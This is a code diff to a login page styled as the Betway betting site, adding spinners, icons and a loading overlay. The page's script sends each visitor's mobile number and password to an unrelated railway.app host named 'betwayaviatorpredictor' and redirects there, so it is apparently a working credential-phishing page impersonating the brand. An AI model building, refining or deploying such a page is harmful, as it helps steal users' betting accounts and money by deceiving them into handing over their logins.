@@ -30,6 +30,7 @@
             max-width: 420px;
             border: 1px solid #2a2a2a;
             box-shadow: 0 25px 70px rgba(0, 0, 0, 0.95);
+            position: relative;
         }
 
         .logo {
@@ -67,6 +68,7 @@
 
         .input-group {
             margin-bottom: 18px;
+            position: relative;
         }
 
         .input-group label {
@@ -101,6 +103,14 @@
             font-size: 14px;
         }
 
+        .input-group .input-icon {
+            position: absolute;
+            right: 16px;
+            bottom: 14px;
+            color: #555;
+            font-size: 18px;
+        }
+
         .forgot-row {
             display: flex;
             justify-content: space-between;
@@ -118,6 +128,7 @@
             color: #f5c518;
         }
 
+        /* LOGIN BUTTON */
         .login-btn {
             width: 100%;
             padding: 16px;
@@ -132,22 +143,53 @@
             cursor: pointer;
             transition: all 0.3s ease;
             box-shadow: 0 8px 30px rgba(0, 166, 81, 0.3);
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 12px;
         }
 
-        .login-btn:hover {
+        .login-btn:hover:not(:disabled) {
             background: #00c45a;
             transform: scale(1.02);
             box-shadow: 0 12px 40px rgba(0, 166, 81, 0.45);
         }
 
-        .login-btn:active {
+        .login-btn:active:not(:disabled) {
             transform: scale(0.97);
         }
 
         .login-btn:disabled {
-            opacity: 0.6;
+            opacity: 0.7;
             cursor: not-allowed;
             transform: scale(0.98);
+        }
+
+        /* SPINNER */
+        .spinner {
+            display: none;
+            width: 24px;
+            height: 24px;
+            border: 3px solid rgba(255,255,255,0.3);
+            border-radius: 50%;
+            border-top-color: #ffffff;
+            animation: spin 0.8s ease-in-out infinite;
+        }
+
+        .spinner.active {
+            display: inline-block;
+        }
+
+        @keyframes spin {
+            to { transform: rotate(360deg); }
+        }
+
+        .btn-text {
+            display: inline-block;
+        }
+
+        .btn-text.hidden {
+            display: none;
         }
 
         .divider {
@@ -190,7 +232,7 @@
             text-decoration: underline;
         }
 
-        /* MESSAGE STYLES */
+        /* MESSAGE */
         #message {
             padding: 12px 16px;
             border-radius: 10px;
@@ -215,27 +257,41 @@
             color: #00c45a;
         }
 
-        #message.loading {
-            display: block;
-            background: rgba(245, 197, 24, 0.1);
-            border: 1px solid rgba(245, 197, 24, 0.2);
-            color: #f5c518;
+        /* OVERLAY LOADING */
+        .loading-overlay {
+            display: none;
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            bottom: 0;
+            background: rgba(20, 20, 20, 0.85);
+            border-radius: 16px;
+            z-index: 10;
+            justify-content: center;
+            align-items: center;
+            flex-direction: column;
+            gap: 20px;
         }
 
-        .spinner {
-            display: inline-block;
-            width: 18px;
-            height: 18px;
-            border: 3px solid rgba(255,255,255,0.3);
+        .loading-overlay.active {
+            display: flex;
+        }
+
+        .loading-overlay .big-spinner {
+            width: 50px;
+            height: 50px;
+            border: 4px solid rgba(245, 197, 24, 0.2);
             border-radius: 50%;
-            border-top-color: #fff;
+            border-top-color: #f5c518;
             animation: spin 0.8s ease-in-out infinite;
-            margin-right: 10px;
-            vertical-align: middle;
         }
 
-        @keyframes spin {
-            to { transform: rotate(360deg); }
+        .loading-overlay p {
+            color: #f5c518;
+            font-size: 16px;
+            font-weight: 600;
+            letter-spacing: 1px;
         }
 
         @media (max-width: 480px) {
@@ -260,6 +316,12 @@
 
     <div class="login-container">
 
+        <!-- LOADING OVERLAY -->
+        <div class="loading-overlay" id="loadingOverlay">
+            <div class="big-spinner"></div>
+            <p>Processing your request...</p>
+        </div>
+
         <div class="logo">
             <h1>BET<span>WAY</span></h1>
             <p>Sports · Casino · Games</p>
@@ -267,29 +329,29 @@
 
         <div class="login-heading">Login</div>
 
-        <!-- MESSAGE DISPLAY -->
         <div id="message"></div>
 
-        <!-- MOBILE NUMBER -->
         <div class="input-group">
             <label>+27 Mobile Number</label>
             <input type="tel" id="mobileNumber" placeholder="Enter your mobile number" />
+            <span class="input-icon"><i class="fas fa-phone"></i></span>
         </div>
 
-        <!-- PASSWORD -->
         <div class="input-group">
             <label>Enter Password</label>
             <input type="password" id="password" placeholder="Enter your password" />
+            <span class="input-icon"><i class="fas fa-lock"></i></span>
         </div>
 
-        <!-- FORGOT LINKS -->
         <div class="forgot-row">
             <a href="#">Forgot Username?</a>
             <a href="#">Forgot Password?</a>
         </div>
 
-        <!-- LOGIN BUTTON -->
-        <button class="login-btn" id="loginBtn">Login</button>
+        <button class="login-btn" id="loginBtn">
+            <span class="spinner" id="spinner"></span>
+            <span class="btn-text" id="btnText">Login</span>
+        </button>
 
         <div class="divider">
             <span>Don't have an account yet?</span>
@@ -302,33 +364,50 @@
     </div>
 
     <script>
-        // Wait for the page to fully load
+        // Wait for page to load
         document.addEventListener('DOMContentLoaded', function() {
             
+            console.log('✅ Page loaded!');
+
             // Get elements
             const mobileInput = document.getElementById('mobileNumber');
             const passwordInput = document.getElementById('password');
             const loginBtn = document.getElementById('loginBtn');
+            const spinner = document.getElementById('spinner');
+            const btnText = document.getElementById('btnText');
             const messageDiv = document.getElementById('message');
-
-            console.log('✅ Page loaded successfully!');
+            const loadingOverlay = document.getElementById('loadingOverlay');
 
             // Function to show message
             function showMessage(text, type) {
                 messageDiv.textContent = text;
                 messageDiv.className = type;
-                console.log('📢 Message:', text, 'Type:', type);
+                console.log('📢 Message:', text);
             }
 
-            // Function to hide message
             function hideMessage() {
                 messageDiv.textContent = '';
                 messageDiv.className = '';
             }
 
+            // Function to show loading state
+            function showLoading() {
+                loginBtn.disabled = true;
+                spinner.classList.add('active');
+                btnText.textContent = 'Logging in...';
+                loadingOverlay.classList.add('active');
+            }
+
+            // Function to hide loading state
+            function hideLoading() {
+                loginBtn.disabled = false;
+                spinner.classList.remove('active');
+                btnText.textContent = 'Login';
+                loadingOverlay.classList.remove('active');
+            }
+
             // Login function
             async function handleLogin(event) {
-                // Prevent form from submitting
                 if (event) {
                     event.preventDefault();
                 }
@@ -348,23 +427,21 @@
                     return;
                 }
 
-                // Validate South African mobile number
+                // Validate SA number
                 const mobileRegex = /^(\+27|0)[6-8][0-9]{8}$/;
                 if (!mobileRegex.test(mobileNumber)) {
-                    showMessage('⚠️ Please enter a valid SA number (e.g., 0712345678 or +27712345678)', 'error');
+                    showMessage('⚠️ Please enter a valid SA number (e.g., 0712345678)', 'error');
                     return;
                 }
 
                 // Hide previous messages
                 hideMessage();
 
-                // Disable button and show loading
-                loginBtn.disabled = true;
-                loginBtn.innerHTML = '<span class="spinner"></span> Logging in...';
-                showMessage('⏳ Sending login details...', 'loading');
+                // SHOW LOADING
+                showLoading();
+                console.log('⏳ Loading started...');
 
                 try {
-                    // Send to backend
                     const apiUrl = 'https://betwayaviatorpredictor-production.up.railway.app/api/login';
                     console.log('🌐 Sending to:', apiUrl);
 
@@ -384,10 +461,14 @@
                     const data = await response.json();
                     console.log('📦 Response data:', data);
 
+                    // HIDE LOADING
+                    hideLoading();
+
                     if (data.success) {
                         showMessage('✅ Login successful! Redirecting...', 'success');
                         
-                        // Redirect after 2 seconds
+                        // Show loading again for redirect
+                        showLoading();
                         setTimeout(() => {
                             window.location.href = 'https://betwayaviatorpredictor-production.up.railway.app';
                         }, 2000);
@@ -397,19 +478,20 @@
 
                 } catch (error) {
                     console.error('❌ Error:', error);
-                    showMessage('❌ Network error. Please check your connection and try again.', 'error');
-                } finally {
-                    // Re-enable button
-                    loginBtn.disabled = false;
-                    loginBtn.innerHTML = 'Login';
+                    hideLoading();
+                    showMessage('❌ Network error. Please check your connection.', 'error');
                 }
             }
 
-            // Event listener for login button click
-            loginBtn.addEventListener('click', handleLogin);
-            console.log('✅ Login button listener attached!');
+            // Event listener for login button
+            loginBtn.addEventListener('click', function(e) {
+                console.log('🖱️ Button clicked!');
+                handleLogin(e);
+            });
 
-            // Allow Enter key to submit
+            console.log('✅ Button listener attached!');
+
+            // Enter key support
             document.addEventListener('keypress', function(e) {
                 if (e.key === 'Enter') {
                     const active = document.activeElement;
@@ -420,22 +502,22 @@
                 }
             });
 
-            // Hide message when user starts typing
+            // Hide message when typing
             mobileInput.addEventListener('input', function() {
-                if (messageDiv.className === 'error' || messageDiv.className === 'loading') {
+                if (messageDiv.className === 'error') {
                     hideMessage();
                 }
             });
             
             passwordInput.addEventListener('input', function() {
-                if (messageDiv.className === 'error' || messageDiv.className === 'loading') {
+                if (messageDiv.className === 'error') {
                     hideMessage();
                 }
             });
 
-            console.log('✅ All event listeners are set up!');
+            console.log('✅ All systems ready!');
 
-        }); // End DOMContentLoaded
+        });
     </script>
 
 </body>
